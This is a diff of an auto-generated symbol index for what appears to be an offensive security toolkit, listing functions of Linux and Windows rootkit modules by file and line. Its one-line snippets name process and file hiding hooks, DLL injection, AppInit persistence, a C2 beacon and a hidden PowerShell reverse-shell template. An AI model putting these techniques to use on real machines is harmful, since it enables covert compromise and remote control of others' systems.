-- Defined: `modules/rootkit/mrhyde.c:121`
-
-### orig_kill (function) `return orig_kill(pid, sig);`
-- Defined: `modules/rootkit/mrhyde.c:141`
-
-### orig_remove (function) `return orig_remove(pathname);`
-- Defined: `modules/rootkit/mrhyde.c:153`
-
-### orig_unlinkat (function) `return orig_unlinkat(dirfd, pathname, flags);`
-- Defined: `modules/rootkit/mrhyde.c:175`
-
-### snprintf (function) `snprintf(path, sizeof(path), "/proc/%d", pid);`
-- Defined: `modules/rootkit/mrhyde.c:183`
-
-### fprintf (function) `fprintf(stderr, "Error in dlsym: %s\n", dlerror());`
-- Defined: `modules/rootkit/mrhyde.c:226`
-
-### orig_fopen (function) `return orig_fopen(pathname, mode);`
-- Defined: `modules/rootkit/mrhyde.c:322`
-
-### orig_open (function) `return orig_open(pathname, flags, mode);`
-- Defined: `modules/rootkit/mrhyde.c:366`
-
-### orig_openat (function) `return orig_openat(dirfd, pathname, flags, mode);`
-- Defined: `modules/rootkit/mrhyde.c:410`
-
-### orig_stat (function) `return orig_stat(pathname, statbuf);`
-- Defined: `modules/rootkit/mrhyde.c:454`
-
-### orig_lstat (function) `return orig_lstat(pathname, statbuf);`
-- Defined: `modules/rootkit/mrhyde.c:498`
-
-### orig_fstat (function) `return orig_fstat(fd, statbuf);`
-- Defined: `modules/rootkit/mrhyde.c:544`
-
-### memmove (function) `memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));`
-- Defined: `modules/rootkit/mrhyde.c:606`
-
-### printf (function) `printf("PID: %ld, Username: %s\n", pid, username);`
-- Defined: `modules/rootkit/mrhyde.c:693`
-
-### closedir (function) `closedir(proc);`
-- Defined: `modules/rootkit/mrhyde.c:698`
+- Defined: `modules/rootkit/mrhyde.c:678`
 
 ## modules/rootkit/mrhyde2.c
 
 ### load_hidden_pids (function) `void load_hidden_pids()`
-- Defined: `modules/rootkit/mrhyde2.c:62`
+- Defined: `modules/rootkit/mrhyde2.c:63`
 
 ### unlink (function) `int unlink(const char *pathname)`
-- Defined: `modules/rootkit/mrhyde2.c:82`
+- Defined: `modules/rootkit/mrhyde2.c:83`
 
 ### kill (function) `int kill(pid_t pid, int sig)`
-- Defined: `modules/rootkit/mrhyde2.c:94`
+- Defined: `modules/rootkit/mrhyde2.c:95`
 
 ### remove (function) `int remove(const char *pathname)`
-- Defined: `modules/rootkit/mrhyde2.c:114`
+- Defined: `modules/rootkit/mrhyde2.c:115`
 
 ### unlinkat (function) `int unlinkat(int dirfd, const char *pathname, int flags)`
-- Defined: `modules/rootkit/mrhyde2.c:126`
+- Defined: `modules/rootkit/mrhyde2.c:127`
 
 ### get_username_from_pid (function) `char* get_username_from_pid(pid_t pid)`
-- Defined: `modules/rootkit/mrhyde2.c:147`
+- Defined: `modules/rootkit/mrhyde2.c:148`
 
 ### should_hide_pid (function) `int should_hide_pid(const char* pid)`
-- Defined: `modules/rootkit/mrhyde2.c:166`
+- Defined: `modules/rootkit/mrhyde2.c:167`
 
 ### readdir (function) `struct dirent* readdir(DIR* dirp)`
-- Defined: `modules/rootkit/mrhyde2.c:181`
+- Defined: `modules/rootkit/mrhyde2.c:182`
 
 ### fopen (function) `FILE *fopen(const char *pathname, const char *mode)`
 - Defined: `modules/rootkit/mrhyde2.c:238`
@@ -32520,61 +32097,7 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Defined: `modules/rootkit/mrhyde2.c:527`
 
 ### main (function) `int main()`
-- Defined: `modules/rootkit/mrhyde2.c:582`
-
-### int (function) `typedef int (*orig_unlink_f_type)(const char *pathname);`
-- Defined: `modules/rootkit/mrhyde2.c:51`
-
-### perror (function) `perror("Error opening PID file");`
-- Defined: `modules/rootkit/mrhyde2.c:66`
-
-### fclose (function) `fclose(file);`
-- Defined: `modules/rootkit/mrhyde2.c:79`
-
-### orig_unlink (function) `return orig_unlink(pathname);`
-- Defined: `modules/rootkit/mrhyde2.c:91`
-
-### orig_kill (function) `return orig_kill(pid, sig);`
-- Defined: `modules/rootkit/mrhyde2.c:111`
-
-### orig_remove (function) `return orig_remove(pathname);`
-- Defined: `modules/rootkit/mrhyde2.c:123`
-
-### orig_unlinkat (function) `return orig_unlinkat(dirfd, pathname, flags);`
-- Defined: `modules/rootkit/mrhyde2.c:145`
-
-### snprintf (function) `snprintf(path, sizeof(path), "/proc/%d", pid);`
-- Defined: `modules/rootkit/mrhyde2.c:153`
-
-### fprintf (function) `fprintf(stderr, "Error in dlsym: %s\n", dlerror());`
-- Defined: `modules/rootkit/mrhyde2.c:186`
-
-### orig_fopen (function) `return orig_fopen(pathname, mode);`
-- Defined: `modules/rootkit/mrhyde2.c:270`
-
-### orig_open (function) `return orig_open(pathname, flags, mode);`
-- Defined: `modules/rootkit/mrhyde2.c:307`
-
-### orig_openat (function) `return orig_openat(dirfd, pathname, flags, mode);`
-- Defined: `modules/rootkit/mrhyde2.c:344`
-
-### orig_stat (function) `return orig_stat(pathname, statbuf);`
-- Defined: `modules/rootkit/mrhyde2.c:381`
-
-### orig_lstat (function) `return orig_lstat(pathname, statbuf);`
-- Defined: `modules/rootkit/mrhyde2.c:418`
-
-### orig_fstat (function) `return orig_fstat(fd, statbuf);`
-- Defined: `modules/rootkit/mrhyde2.c:457`
-
-### memmove (function) `memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));`
-- Defined: `modules/rootkit/mrhyde2.c:515`
-
-### printf (function) `printf("PID: %ld, Username: %s\n", pid, username);`
-- Defined: `modules/rootkit/mrhyde2.c:598`
-
-### closedir (function) `closedir(proc);`
-- Defined: `modules/rootkit/mrhyde2.c:603`
+- Defined: `modules/rootkit/mrhyde2.c:583`
 
 ## modules/rootkit/mrhyde3.c
 
@@ -32606,7 +32129,7 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Doc: struct io_uring_sqe *sqe = &ring->sq.sqes[tail & *ring->sq.ring_mask]; memset(sqe, 0, sizeof(*sqe)); return sqe; } /* En
 
 ### uring_cqe_seen (function) `static void uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe)`
-- Defined: `modules/rootkit/mrhyde3.c:162`
+- Defined: `modules/rootkit/mrhyde3.c:163`
 
 ### init_root_ring (function) `static int init_root_ring(void)`
 - Defined: `modules/rootkit/mrhyde3.c:176`
@@ -32625,23 +32148,23 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Doc: FILE *f = fopen(path, "rb"); if (!f) return NULL; fseek(f, 0, SEEK_END); long size = ftell(f); fseek(f, 0, SEEK_SET); ch
 
 ### load_hidden_files (function) `void load_hidden_files(void)`
-- Defined: `modules/rootkit/mrhyde3.c:281`
+- Defined: `modules/rootkit/mrhyde3.c:282`
 
 ### get_username_from_pid (function) `char* get_username_from_pid(pid_t pid)`
 - Defined: `modules/rootkit/mrhyde3.c:297`
 - Doc: char *data = uring_read_whole_file(FILE_HIDE_PATH); if (!data) data = traditional_read_file(FILE_HIDE_PATH); if (!data) 
 
 ### should_hide_pid (function) `int should_hide_pid(const char* pid)`
-- Defined: `modules/rootkit/mrhyde3.c:319`
+- Defined: `modules/rootkit/mrhyde3.c:320`
 
 ### should_hide_file (function) `int should_hide_file(const char* filename)`
 - Defined: `modules/rootkit/mrhyde3.c:329`
 
 ### readdir (function) `struct dirent* readdir(DIR* dirp)`
-- Defined: `modules/rootkit/mrhyde3.c:335`
+- Defined: `modules/rootkit/mrhyde3.c:336`
 
 ### unlink (function) `int unlink(const char *pathname)`
-- Defined: `modules/rootkit/mrhyde3.c:366`
+- Defined: `modules/rootkit/mrhyde3.c:367`
 
 ### kill (function) `int kill(pid_t pid, int sig)`
 - Defined: `modules/rootkit/mrhyde3.c:373`
@@ -32656,10 +32179,10 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Defined: `modules/rootkit/mrhyde3.c:407`
 
 ### open (function) `int open(const char *pathname, int flags, ...)`
-- Defined: `modules/rootkit/mrhyde3.c:429`
+- Defined: `modules/rootkit/mrhyde3.c:430`
 
 ### openat (function) `int openat(int dirfd, const char *pathname, int flags, ...)`
-- Defined: `modules/rootkit/mrhyde3.c:457`
+- Defined: `modules/rootkit/mrhyde3.c:458`
 
 ### stat (function) `int stat(const char *pathname, struct stat *statbuf)`
 - Defined: `modules/rootkit/mrhyde3.c:487`
@@ -32674,91 +32197,7 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Defined: `modules/rootkit/mrhyde3.c:569`
 
 ### getdents64 (function) `ssize_t getdents64(int fd, void *dirp, size_t count)`
-- Defined: `modules/rootkit/mrhyde3.c:604`
-
-### syscall (function) `return syscall(__NR_io_uring_setup, entries, p);`
-- Defined: `modules/rootkit/mrhyde3.c:74`
-
-### memset (function) `memset(&params, 0, sizeof(params));`
-- Defined: `modules/rootkit/mrhyde3.c:87`
-
-### free (function) `free(iov.iov_base);`
-- Defined: `modules/rootkit/mrhyde3.c:191`
-
-### pthread_mutex_lock (function) `pthread_mutex_lock(&ring_mutex);`
-- Defined: `modules/rootkit/mrhyde3.c:199`
-
-### memcpy (function) `memcpy(buf + total_read, block, bytes_read);`
-- Defined: `modules/rootkit/mrhyde3.c:242`
-
-### close (function) `close(fd);`
-- Defined: `modules/rootkit/mrhyde3.c:246`
-
-### pthread_mutex_unlock (function) `pthread_mutex_unlock(&ring_mutex);`
-- Defined: `modules/rootkit/mrhyde3.c:248`
-
-### fseek (function) `fseek(f, 0, SEEK_END);`
-- Defined: `modules/rootkit/mrhyde3.c:256`
-
-### fclose (function) `fclose(f);`
-- Defined: `modules/rootkit/mrhyde3.c:263`
-
-### snprintf (function) `snprintf(path, sizeof(path), "/proc/%d", pid);`
-- Defined: `modules/rootkit/mrhyde3.c:302`
-
-### int (function) `typedef int (*orig_unlink_f_type)(const char *pathname);`
-- Defined: `modules/rootkit/mrhyde3.c:314`
-
-### orig_unlink (function) `return orig_unlink(pathname);`
-- Defined: `modules/rootkit/mrhyde3.c:371`
-
-### orig_kill (function) `return orig_kill(pid, sig);`
-- Defined: `modules/rootkit/mrhyde3.c:381`
-
-### orig_remove (function) `return orig_remove(pathname);`
-- Defined: `modules/rootkit/mrhyde3.c:387`
-
-### orig_unlinkat (function) `return orig_unlinkat(dirfd, pathname, flags);`
-- Defined: `modules/rootkit/mrhyde3.c:403`
-
-### orig_fopen (function) `return orig_fopen(pathname, mode);`
-- Defined: `modules/rootkit/mrhyde3.c:427`
-
-### va_start (function) `va_start(args, flags);`
-- Defined: `modules/rootkit/mrhyde3.c:452`
-
-### va_end (function) `va_end(args);`
-- Defined: `modules/rootkit/mrhyde3.c:454`
-
-### orig_open (function) `return orig_open(pathname, flags, mode);`
-- Defined: `modules/rootkit/mrhyde3.c:455`
-
-### orig_openat (function) `return orig_openat(dirfd, pathname, flags, mode);`
-- Defined: `modules/rootkit/mrhyde3.c:483`
-
-### orig_stat (function) `return orig_stat(pathname, statbuf);`
-- Defined: `modules/rootkit/mrhyde3.c:507`
-
-### orig_lstat (function) `return orig_lstat(pathname, statbuf);`
-- Defined: `modules/rootkit/mrhyde3.c:531`
-
-### orig_fstat (function) `return orig_fstat(fd, statbuf);`
-- Defined: `modules/rootkit/mrhyde3.c:557`
-
-### memmove (function) `memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));`
-- Defined: `modules/rootkit/mrhyde3.c:596`
-
-### inet_pton (function) `inet_pton(AF_INET, C2_SERVER_IP, &server_addr.sin_addr);`
-- Defined: `modules/rootkit/mrhyde3.c:657`
-
-### sleep (function) `sleep(60);`
-- Defined: `modules/rootkit/mrhyde3.c:697`
-
-### pthread_create (function) `pthread_create(&c2_thread, NULL, c2_beacon_thread, NULL);`
-- Defined: `modules/rootkit/mrhyde3.c:714`
-
-### pthread_detach (function) `pthread_detach(c2_thread);`
-- Defined: `modules/rootkit/mrhyde3.c:715`
+- Defined: `modules/rootkit/mrhyde3.c:605`
 
 ## modules/rootkit/rootkit.asm
 
@@ -32800,64 +32239,6 @@ str_cut(char str[], int slice_from, int slice_to)`
 ### unhook_syscalls (function) `static void __exit unhook_syscalls(void)`
 - Defined: `modules/rootkit/rootkit.c:208`
 - Doc: Function to unhook system calls
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### long (function) `asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);`
-- Defined: `modules/rootkit/rootkit.c:38`
-- Doc: Original system call functions
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### ssize_t (function) `asmlinkage ssize_t (*original_read)(int fd, void __user *buf, size_t count);`
-- Defined: `modules/rootkit/rootkit.c:40`
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### memmove (function) `memmove(dirent + offset, dirent + offset + dir->d_reclen, ret - (offset + dir->d_reclen));`
-- Defined: `modules/rootkit/rootkit.c:89`
-- Doc: Hide the process or file by removing it from the directory listing
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### printk (function) `printk(KERN_INFO "Special string found: %s\n", buffer);`
-- Defined: `modules/rootkit/rootkit.c:146`
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### sock_release (function) `sock_release(sock);`
-- Defined: `modules/rootkit/rootkit.c:161`
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### call_usermodehelper (function) `call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);`
-- Defined: `modules/rootkit/rootkit.c:166`
-- Doc: Execute shell
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### strlen (function) `return strlen(backdoor_message);`
-- Defined: `modules/rootkit/rootkit.c:174`
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### original_read (function) `return original_read(fd, buf, count);`
-- Defined: `modules/rootkit/rootkit.c:176`
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### volatile (function) `asm volatile("mov %%cr4, %0" : "=r" (cr4));`
-- Defined: `modules/rootkit/rootkit.c:185`
-- Doc: Read the current value of CR4
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### register_kretprobe (function) `register_kretprobe(&kretprobe_getdents);`
-- Defined: `modules/rootkit/rootkit.c:200`
-- Doc: Register kretprobes
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### unregister_kretprobe (function) `unregister_kretprobe(&kretprobe_getdents);`
-- Defined: `modules/rootkit/rootkit.c:210`
-- Doc: Unregister kretprobes
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### module_init (function) `module_init(hook_syscalls);`
-- Defined: `modules/rootkit/rootkit.c:214`
-- Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
-
-### MODULE_LICENSE (function) `MODULE_LICENSE("GPL");`
-- Defined: `modules/rootkit/rootkit.c:217`
 - Depends on: `core/crypto.py`, `lazyown-docker/init.sh`
 
 ## modules/saas_attacks.py
@@ -34846,88 +34227,28 @@ str_cut(char str[], int slice_from, int slice_to)`
 ## modules/win_rootkit/backup.c
 
 ### elp (function) `void elp()`
-- Defined: `modules/win_rootkit/backup.c:63`
+- Defined: `modules/win_rootkit/backup.c:66`
 
 ### ensure_pid_file_exists (function) `void ensure_pid_file_exists()`
-- Defined: `modules/win_rootkit/backup.c:85`
+- Defined: `modules/win_rootkit/backup.c:86`
 
 ### ensure_key_file_exists (function) `void ensure_key_file_exists()`
-- Defined: `modules/win_rootkit/backup.c:122`
+- Defined: `modules/win_rootkit/backup.c:123`
 
 ### ensure_hide_file_exists (function) `void ensure_hide_file_exists()`
-- Defined: `modules/win_rootkit/backup.c:149`
+- Defined: `modules/win_rootkit/backup.c:150`
 
 ### infect_command (function) `void infect_command()`
-- Defined: `modules/win_rootkit/backup.c:178`
+- Defined: `modules/win_rootkit/backup.c:179`
 
 ### handle_client (function) `DWORD WINAPI handle_client(LPVOID client_socket)`
-- Defined: `modules/win_rootkit/backup.c:203`
+- Defined: `modules/win_rootkit/backup.c:204`
 
 ### monitor_shell (function) `DWORD WINAPI monitor_shell(LPVOID data)`
-- Defined: `modules/win_rootkit/backup.c:428`
+- Defined: `modules/win_rootkit/backup.c:430`
 
 ### main (function) `int main()`
 - Defined: `modules/win_rootkit/backup.c:540`
-
-### printf (function) `printf("LD_PRELOAD setted as C:\\Windows\\System32\\mrhyde.dll\n");`
-- Defined: `modules/win_rootkit/backup.c:69`
-
-### ZeroMemory (function) `ZeroMemory(&si, sizeof(si));`
-- Defined: `modules/win_rootkit/backup.c:73`
-
-### perror (function) `perror("CreateProcess failed");`
-- Defined: `modules/win_rootkit/backup.c:77`
-
-### exit (function) `exit(EXIT_FAILURE);`
-- Defined: `modules/win_rootkit/backup.c:78`
-
-### WaitForSingleObject (function) `WaitForSingleObject(pi.hProcess, INFINITE);`
-- Defined: `modules/win_rootkit/backup.c:80`
-
-### CloseHandle (function) `CloseHandle(pi.hProcess);`
-- Defined: `modules/win_rootkit/backup.c:81`
-
-### fclose (function) `fclose(file);`
-- Defined: `modules/win_rootkit/backup.c:94`
-
-### _pclose (function) `_pclose(cmd);`
-- Defined: `modules/win_rootkit/backup.c:107`
-
-### fprintf (function) `fprintf(stderr, "Attempt %d: Failed to execute process check. Error: %s\n", current_attempt + 1, strerror(errno));`
-- Defined: `modules/win_rootkit/backup.c:111`
-
-### Sleep (function) `Sleep(1000 * (current_attempt + 1));`
-- Defined: `modules/win_rootkit/backup.c:114`
-
-### WriteProcessMemory (function) `WriteProcessMemory(hProcess, remoteMemory, &hModule, sizeof(hModule), NULL);`
-- Defined: `modules/win_rootkit/backup.c:199`
-
-### CreateRemoteThread (function) `CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibrary, remoteMemory, 0, NULL);`
-- Defined: `modules/win_rootkit/backup.c:200`
-
-### free (function) `free(client_socket);`
-- Defined: `modules/win_rootkit/backup.c:206`
-
-### closesocket (function) `closesocket(sock);`
-- Defined: `modules/win_rootkit/backup.c:218`
-
-### memset (function) `memset(buffer, 0, BUFFER_SIZE);`
-- Defined: `modules/win_rootkit/backup.c:221`
-
-### send (function) `send(sock, error_msg, strlen(error_msg), 0);`
-- Defined: `modules/win_rootkit/backup.c:246`
-
-### snprintf (function) `snprintf(command, BUFFER_SIZE, "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('%s', %d);`
-- Defined: `modules/win_rootkit/backup.c:299`
-
-### _putenv_s (function) `_putenv_s("LD_PRELOAD", "");`
-- Defined: `modules/win_rootkit/backup.c:390`
-
-### time (function) `time(&start_date);`
-- Defined: `modules/win_rootkit/backup.c:585`
-
-### WSACleanup (function) `WSACleanup();`
-- Defined: `modules/win_rootkit/backup.c:630`
 
 ## modules/win_rootkit/mrhyde.c
 
@@ -34936,25 +34257,25 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Doc: Define the RunExperiment function
 
 ### load_hidden_pids (function) `void load_hidden_pids()`
-- Defined: `modules/win_rootkit/mrhyde.c:23`
+- Defined: `modules/win_rootkit/mrhyde.c:24`
 
 ### load_hidden_files (function) `void load_hidden_files()`
-- Defined: `modules/win_rootkit/mrhyde.c:46`
+- Defined: `modules/win_rootkit/mrhyde.c:47`
 
 ### FindProcessId (function) `DWORD FindProcessId(const char* processName)`
 - Defined: `modules/win_rootkit/mrhyde.c:89`
 
 ### HideProcessByPID (function) `void HideProcessByPID(DWORD pid)`
-- Defined: `modules/win_rootkit/mrhyde.c:114`
+- Defined: `modules/win_rootkit/mrhyde.c:115`
 
 ### search_pid (function) `BOOL search_pid()`
-- Defined: `modules/win_rootkit/mrhyde.c:136`
+- Defined: `modules/win_rootkit/mrhyde.c:137`
 
 ### should_hide_pid (function) `BOOL should_hide_pid(DWORD pid)`
 - Defined: `modules/win_rootkit/mrhyde.c:147`
 
 ### should_hide_file (function) `BOOL should_hide_file(const char* filename)`
-- Defined: `modules/win_rootkit/mrhyde.c:159`
+- Defined: `modules/win_rootkit/mrhyde.c:161`
 
 ### HookedFindFirstFile (function) `HANDLE WINAPI HookedFindFirstFile(LPCSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData)`
 - Defined: `modules/win_rootkit/mrhyde.c:171`
@@ -34981,49 +34302,7 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Doc: Función para realizar el hooking de las funciones
 
 ### DllMain (function) `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)`
-- Defined: `modules/win_rootkit/mrhyde.c:271`
-
-### FormatMessage (function) `FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, errorMsg, sizeof(errorMsg), NULL);`
-- Defined: `modules/win_rootkit/mrhyde.c:29`
-
-### fprintf (function) `fprintf(stderr, "Error opening PID file: %s\n", errorMsg);`
-- Defined: `modules/win_rootkit/mrhyde.c:30`
-
-### fclose (function) `fclose(file);`
-- Defined: `modules/win_rootkit/mrhyde.c:43`
-
-### Sleep (function) `Sleep(1000 * (retry_count + 1));`
-- Defined: `modules/win_rootkit/mrhyde.c:56`
-
-### Process32First (function) `Process32First(processesSnapshot, &processInfo);`
-- Defined: `modules/win_rootkit/mrhyde.c:97`
-
-### CloseHandle (function) `CloseHandle(processesSnapshot);`
-- Defined: `modules/win_rootkit/mrhyde.c:100`
-
-### strcpy (function) `strcpy(pe.szExeFile, "");`
-- Defined: `modules/win_rootkit/mrhyde.c:129`
-
-### printf (function) `printf("Process hidden\n");`
-- Defined: `modules/win_rootkit/mrhyde.c:141`
-
-### sprintf (function) `sprintf(pid_str, "%lu", pid);`
-- Defined: `modules/win_rootkit/mrhyde.c:150`
-
-### SetLastError (function) `SetLastError(ERROR_FILE_NOT_FOUND);`
-- Defined: `modules/win_rootkit/mrhyde.c:173`
-
-### FindFirstFile (function) `return FindFirstFile(lpFileName, lpFindFileData);`
-- Defined: `modules/win_rootkit/mrhyde.c:176`
-
-### FindNextFile (function) `return FindNextFile(hFindFile, lpFindFileData);`
-- Defined: `modules/win_rootkit/mrhyde.c:185`
-
-### VirtualProtect (function) `VirtualProtect(&originalFindFirstFile, sizeof(FARPROC), PAGE_READWRITE, &oldProtect);`
-- Defined: `modules/win_rootkit/mrhyde.c:229`
-
-### free (function) `free(hide_pids[i]);`
-- Defined: `modules/win_rootkit/mrhyde.c:284`
+- Defined: `modules/win_rootkit/mrhyde.c:272`
 
 ## modules/win_rootkit/win_rin3_rootkit.cs
 
@@ -35042,10 +34321,10 @@ str_cut(char str[], int slice_from, int slice_to)`
 ## modules/win_rootkit/win_ring3_rootkit.c
 
 ### DownloadDLL (function) `BOOL DownloadDLL(const char* url, PBYTE* buffer, DWORD* size)`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:78`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:79`
 
 ### ReflectiveLoadDLL (function) `BOOL ReflectiveLoadDLL(PBYTE dllBuffer, DWORD dllSize)`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:98`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:99`
 
 ### initPIDArray (function) `void initPIDArray(PIDArray *array)`
 - Defined: `modules/win_rootkit/win_ring3_rootkit.c:146`
@@ -35060,142 +34339,48 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Doc: Función para liberar la memoria del arreglo de PIDs
 
 ### getPIDsFromTasklist (function) `void getPIDsFromTasklist(PIDArray *pidArray)`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:165`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:166`
 
 ### AddDllToAppInitDLLs (function) `BOOL AddDllToAppInitDLLs(const char* dllPath)`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:190`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:191`
 
 ### GetProcessIdByName (function) `DWORD GetProcessIdByName(const char* processName)`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:238`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:240`
 
 ### Gifted (function) `BOOL Gifted(DWORD processId, const char* dllPath)`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:268`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:270`
 
 ### elp (function) `void elp()`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:361`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:362`
 
 ### ensure_pid_file_exists (function) `void ensure_pid_file_exists()`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:381`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:382`
 
 ### ensure_key_file_exists (function) `void ensure_key_file_exists()`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:418`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:419`
 
 ### ensure_hide_file_exists (function) `void ensure_hide_file_exists()`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:445`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:446`
 
 ### giveGift (function) `BOOL giveGift()`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:474`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:475`
 
 ### handle_client (function) `DWORD WINAPI handle_client(LPVOID client_socket)`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:524`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:526`
 
 ### monitor_shell (function) `DWORD WINAPI monitor_shell(LPVOID data)`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:753`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.c:755`
 
 ### main (function) `int main()`
 - Defined: `modules/win_rootkit/win_ring3_rootkit.c:865`
 
-### void (function) `typedef void (__cdecl *RunExperimentFunc)();`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:74`
-
-### BOOL (function) `typedef BOOL(WINAPI *DllMainEntry)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:77`
-- Doc: Define the DllMainEntry type
-
-### InternetCloseHandle (function) `InternetCloseHandle(hInternet);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:85`
-
-### memcpy (function) `memcpy(baseAddress, dllBuffer, ntHeader->OptionalHeader.SizeOfHeaders);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:107`
-
-### dllMain (function) `dllMain((HINSTANCE)baseAddress, DLL_PROCESS_ATTACH, NULL);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:136`
-
-### RunExperiment (function) `RunExperiment();`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:139`
-
-### free (function) `free(array->pids);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:163`
-
-### strcpy (function) `strcpy(command, "tasklist /FO CSV /NH");`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:168`
-
-### printf (function) `printf("Error al ejecutar tasklist\n");`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:172`
-
-### _pclose (function) `_pclose(pipe);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:187`
-
-### RegCloseKey (function) `RegCloseKey(hKey);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:215`
-
-### strcat (function) `strcat(valueData, dllPath);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:224`
-
-### wcstombs_s (function) `wcstombs_s(&converted, exeName, sizeof(exeName), processEntry.szExeFile, MAX_PATH);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:254`
-
-### CloseHandle (function) `CloseHandle(snapshot);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:263`
-
-### GetModuleHandle (function) `GetModuleHandle("kernel32.dll"), "LoadLibraryA" );`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:289`
-
-### VirtualFreeEx (function) `VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:324`
-
-### WaitForSingleObject (function) `WaitForSingleObject(hThread, INFINITE);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:346`
-
-### GetExitCodeThread (function) `GetExitCodeThread(hThread, &exitCode);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:352`
-
-### ZeroMemory (function) `ZeroMemory(&si, sizeof(si));`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:369`
-
-### perror (function) `perror("CreateProcess failed");`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:373`
-
-### exit (function) `exit(EXIT_FAILURE);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:374`
-
-### fclose (function) `fclose(file);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:390`
-
-### fprintf (function) `fprintf(stderr, "Attempt %d: Failed to execute process check. Error: %s\n", current_attempt + 1, strerror(errno));`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:407`
-
-### Sleep (function) `Sleep(1000 * (current_attempt + 1));`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:410`
-
-### closesocket (function) `closesocket(sock);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:540`
-
-### memset (function) `memset(buffer, 0, BUFFER_SIZE);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:543`
-
-### send (function) `send(sock, error_msg, strlen(error_msg), 0);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:568`
-
-### snprintf (function) `snprintf(command, BUFFER_SIZE, "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('%s', %d);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:621`
-
-### _putenv_s (function) `_putenv_s("LD_PRELOAD", "");`
